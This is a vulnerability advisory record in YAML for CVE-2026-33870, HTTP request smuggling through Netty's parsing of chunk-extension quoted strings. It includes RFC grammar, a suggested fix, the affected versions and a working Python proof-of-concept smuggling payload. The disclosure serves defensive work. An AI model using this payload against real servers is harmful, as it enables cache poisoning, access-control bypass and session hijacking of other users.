@@ -1,0 +1,203 @@
+advisory_id: GHSA-pwqr-wmgm-9rr8
+datasource_id: github_osv_importer_v2/GHSA-pwqr-wmgm-9rr8
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-pwqr-wmgm-9rr8/GHSA-pwqr-wmgm-9rr8.json
+aliases:
+  - CVE-2026-33870
+summary: |
+  Netty: HTTP Request Smuggling via Chunked Extension Quoted-String Parsing
+  ## Summary
+
+  Netty incorrectly parses quoted strings in HTTP/1.1 chunked transfer encoding extension values, enabling request smuggling attacks.
+
+  ## Background
+
+  This vulnerability is a new variant discovered during research into the "Funky Chunks" HTTP request smuggling techniques:
+
+  - <https://w4ke.info/2025/06/18/funky-chunks.html>
+  - <https://w4ke.info/2025/10/29/funky-chunks-2.html>
+
+  The original research tested various chunk extension parsing differentials but did not cover quoted-string handling within extension values.
+
+  ## Technical Details
+
+  **RFC 9110 Section 7.1.1** defines chunked transfer encoding:
+
+  ```
+  chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF
+  chunk-ext = *( BWS ";" BWS chunk-ext-name [ BWS "=" BWS chunk-ext-val ] )
+  chunk-ext-val = token / quoted-string
+  ```
+
+  **RFC 9110 Section 5.6.4** defines quoted-string:
+
+  ```
+  quoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE
+  ```
+
+  Critically, the allowed character ranges within a quoted-string are:
+
+  ```
+  qdtext = HTAB / SP / %x21 / %x23-5B / %x5D-7E / obs-text
+  quoted-pair = "\" ( HTAB / SP / VCHAR / obs-text )
+  ```
+
+  CR (`%x0D`) and LF (`%x0A`) bytes fall outside all of these ranges and are therefore **not permitted** inside chunk extensions—whether quoted or unquoted. A strictly compliant parser should reject any request containing CR or LF bytes before the actual line terminator within a chunk extension with a `400 Bad Request` response (as Squid does, for example).
+
+  ## Vulnerability
+
+  Netty terminates chunk header parsing at `\r\n` inside quoted strings instead of rejecting the request as malformed. This creates a parsing differential between Netty and RFC-compliant parsers, which can be exploited for request smuggling.
+
+  **Expected behavior (RFC-compliant):**
+  A request containing CR/LF bytes within a chunk extension value should be rejected outright as invalid.
+
+  **Actual behavior (Netty):**
+
+  ```
+  Chunk: 1;a="value
+              ^^^^^ parsing terminates here at \r\n (INCORRECT)
+  Body: here"... is treated as body or the beginning of a subsequent request
+  ```
+
+  The root cause is that Netty does not validate that CR/LF bytes are forbidden inside chunk extensions before the terminating CRLF. Rather than attempting to parse through quoted strings, the appropriate fix is to reject such requests entirely.
+
+  ## Proof of Concept
+
+  ```python
+  #!/usr/bin/env python3
+  import socket
+
+  payload = (
+      b"POST / HTTP/1.1\r\n"
+      b"Host: localhost\r\n"
+      b"Transfer-Encoding: chunked\r\n"
+      b"\r\n"
+      b'1;a="\r\n'
+      b"X\r\n"
+      b"0\r\n"
+      b"\r\n"
+      b"GET /smuggled HTTP/1.1\r\n"
+      b"Host: localhost\r\n"
+      b"Content-Length: 11\r\n"
+      b"\r\n"
+      b'"\r\n'
+      b"Y\r\n"
+      b"0\r\n"
+      b"\r\n"
+  )
+
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  sock.settimeout(3)
+  sock.connect(("127.0.0.1", 8080))
+  sock.sendall(payload)
+
+  response = b""
+  while True:
+      try:
+          chunk = sock.recv(4096)
+          if not chunk:
+              break
+          response += chunk
+      except socket.timeout:
+          break
+
+  sock.close()
+  print(f"Responses: {response.count(b'HTTP/')}")
+  print(response.decode(errors="replace"))
+  ```
+
+  **Result:** The server returns two HTTP responses from a single TCP connection, confirming request smuggling.
+
+  ### Parsing Breakdown
+
+  | Parser                | Request 1         | Request 2                          |
+  |-----------------------|-------------------|------------------------------------|
+  | Netty (vulnerable)    | POST / body="X"  | GET /smuggled (SMUGGLED)           |
+  | RFC-compliant parser  | 400 Bad Request   | (none — malformed request rejected)|
+
+  ## Impact
+
+  - **Request Smuggling**: An attacker can inject arbitrary HTTP requests into a connection.
+  - **Cache Poisoning**: Smuggled responses may poison shared caches.
+  - **Access Control Bypass**: Smuggled requests can circumvent frontend security controls.
+  - **Session Hijacking**: Smuggled requests may intercept responses intended for other users.
+
+  ## Reproduction
+
+  1. Start the minimal proof-of-concept environment using the provided Docker configuration.
+  2. Execute the proof-of-concept script included in the attached archive.
+
+  ## Suggested Fix
+
+  The parser should reject requests containing CR or LF bytes within chunk extensions rather than attempting to interpret them:
+
+  ```
+  1. Read chunk-size.
+  2. If ';' is encountered, begin parsing extensions:
+     a. For each byte before the terminating CRLF:
+        - If CR (%x0D) or LF (%x0A) is encountered outside the
+          final terminating CRLF, reject the request with 400 Bad Request.
+     b. If the extension value begins with DQUOTE, validate that all
+        enclosed bytes conform to the qdtext / quoted-pair grammar.
+  3. Only treat CRLF as the chunk header terminator when it appears
+     outside any quoted-string context and contains no preceding
+     illegal bytes.
+  ```
+
+  ## Acknowledgments
+
+  Credit to Ben Kallus for clarifying the RFC interpretation during discussion on the HAProxy mailing list.
+
+  ## Resources
+
+  - [RFC 9110: HTTP Semantics (Sections 5.6.4, 7.1.1)](https://www.rfc-editor.org/rfc/rfc9110)
+  - [Funky Chunks Research](https://w4ke.info/2025/06/18/funky-chunks.html)
+  - [Funky Chunks 2 Research](https://w4ke.info/2025/10/29/funky-chunks-2.html)
+
+  ## Attachments
+
+  ![Vulnerability Diagram](https://github.com/user-attachments/assets/2faaa23e-693b-4efc-afb7-aae1d4101e7e)
+
+  [java_netty.zip](https://github.com/user-attachments/files/24697955/java_netty.zip)
+impacted_packages:
+  - purl: pkg:maven/io.netty/netty-codec-http
+    affected_versions: vers:maven/<4.1.132.Final
+    fixed_versions: vers:maven/4.1.132.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.netty/netty-codec-http
+    affected_versions: vers:maven/>=4.2.0.Alpha1|<4.2.10.Final
+    fixed_versions: vers:maven/4.2.10.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-pwqr-wmgm-9rr8/GHSA-pwqr-wmgm-9rr8.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-444
+references:
+  - url: https://github.com/netty/netty
+    reference_type:
+    reference_id:
+  - url: https://github.com/netty/netty/security/advisories/GHSA-pwqr-wmgm-9rr8
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33870
+    reference_type:
+    reference_id:
+  - url: https://w4ke.info/2025/06/18/funky-chunks.html
+    reference_type:
+    reference_id:
+  - url: https://w4ke.info/2025/10/29/funky-chunks-2.html
+    reference_type:
+    reference_id:
+  - url: https://www.rfc-editor.org/rfc/rfc9110
+    reference_type:
+    reference_id:
